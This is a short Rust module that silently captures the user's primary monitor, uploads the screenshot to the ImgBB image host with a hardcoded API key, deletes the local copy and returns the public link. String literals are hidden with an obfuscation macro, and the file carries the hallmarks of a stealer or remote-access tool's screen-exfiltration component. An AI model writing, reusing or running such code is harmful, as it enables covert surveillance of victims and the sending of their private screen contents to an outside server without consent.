use std::fs;
use std::path::PathBuf;
use xcap::Monitor;
use imgbb::ImgBB;

fn take_screenshot(path: &PathBuf)  {
    let monitor = Monitor::all().unwrap();
    let first_monitor = monitor.first().unwrap();
    first_monitor.capture_image().unwrap().save(path).unwrap();
}

pub(crate) async fn url_screnshot() -> String {
    let imgbb = ImgBB::new(lc!("a90f709ccb546b08eede564ee2e84a7c"));
    let path = PathBuf::from(lc!("./596a96cc7bf9108cd896f33c44aedc8a.png"));
    take_screenshot(&path);
    let response = imgbb.read_file(&path).unwrap().expiration(86400).upload().await;
    fs::remove_file(path).unwrap();
    response.unwrap().data.unwrap().url.unwrap()
}